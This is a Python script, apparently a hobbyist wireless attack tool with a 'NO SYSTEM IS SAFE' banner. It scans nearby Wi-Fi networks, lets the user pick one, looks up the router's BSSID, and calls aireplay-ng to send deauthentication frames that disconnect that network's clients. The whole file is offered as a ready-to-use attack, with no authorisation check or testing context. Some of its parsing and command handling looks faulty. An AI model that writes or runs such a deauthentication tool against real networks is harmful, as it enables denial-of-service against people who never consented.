import subprocess
import time
import sys
import pyfiglet

# ANSI escape codes for colors
BLUE = '\033[94m'
RESET = '\033[0m'

# Function to scan for Wi-Fi networks
def scan_wifi():
    print(f"{BLUE}Scanning for Wi-Fi networks...{RESET}")
    networks = []
    
    # Use iwlist to scan available networks
    try:
        result = subprocess.check_output(["sudo", "iwlist", "wlan0", "scan"])
        result = result.decode('utf-8')
        
        # Look for SSID and BSSID in the output
        lines = result.split('\n')
        for line in lines:
            if "ESSID" in line:
                ssid = line.split(':')[1].strip().strip('"')
                networks.append(ssid)
        return networks
    except subprocess.CalledProcessError as e:
        print(f"{BLUE}Error scanning Wi-Fi networks: {e}{RESET}")
        return []

# Function to perform a deauthentication attack on the selected router
def attack_router(target_bssid, interface="wlan0"):
    print(f"{BLUE}Attacking router {target_bssid} to disconnect it...{RESET}")
    try:
        # Run aireplay-ng to perform a deauthentication attack
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_bssid, interface], check=True)
        print(f"{BLUE}Attack complete. Router disconnected.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{BLUE}Error attacking router: {e}{RESET}")

# Function to get the BSSID (MAC address) of the selected router
def get_router_bssid(ssid):
    # Assuming we use 'iwlist' output to match the SSID to its BSSID
    try:
        result = subprocess.check_output(["sudo", "iwlist", "wlan0", "scan"])
        result = result.decode('utf-8')
        
        lines = result.split('\n')
        bssid = None
        for line in lines:
            if f'ESSID:"{ssid}"' in line:
                # Extract BSSID (MAC address) of the router
                bssid = lines[lines.index(line) - 2].split()[1]
                break
        return bssid
    except subprocess.CalledProcessError as e:
        print(f"{BLUE}Error retrieving BSSID for {ssid}: {e}{RESET}")
        return None

# Function to display the welcome message with animation
def animated_welcome_message():
    message = "NO SYSTEM IS SAFE"
    tool_creator = "Tool created by LAKA."
    
    # Generate ASCII art for the message
    ascii_art = pyfiglet.figlet_format(message)
    
    # Print the ASCII art with animation (each character appears one by one)
    for char in ascii_art:
        sys.stdout.write(f"{BLUE}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(0.05)  # Adjust the speed of animation (0.05 second delay)
    
    time.sleep(0.5)  # Pause before printing the next part

    # Print the second part with animation
    print()  # Move to the next line
    for char in tool_creator:
        sys.stdout.write(f"{BLUE}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)  # Adjust the speed of animation (0.1 second delay)
    
    print()  # Move to the next line after the animation

# Main function to run the script
def main():
    animated_welcome_message()
    
    # Scan for available Wi-Fi networks
    networks = scan_wifi()
    
    if not networks:
        print(f"{BLUE}No networks found. Exiting...{RESET}")
        return
    
    print(f"{BLUE}Available Wi-Fi networks:{RESET}")
    for idx, ssid in enumerate(networks, start=1):
        print(f"{BLUE}{idx}. {ssid}{RESET}")
    
    # Let the user select a router to attack
    try:
        choice = int(input(f"{BLUE}Select the router to attack (1-{len(networks)}):{RESET} "))
        if choice < 1 or choice > len(networks):
            print(f"{BLUE}Invalid selection. Exiting...{RESET}")
            return
        
        selected_ssid = networks[choice - 1]
        print(f"{BLUE}You selected: {selected_ssid}{RESET}")
        
        # Get the BSSID (MAC address) of the selected router
        target_bssid = get_router_bssid(selected_ssid)
        if not target_bssid:
            print(f"{BLUE}Could not retrieve BSSID for {selected_ssid}. Exiting...{RESET}")
            return
        
        # Attack the selected router
        attack_router(target_bssid)
    
    except ValueError:
        print(f"{BLUE}Invalid input. Exiting...{RESET}")

if __name__ == "__main__":
    main()
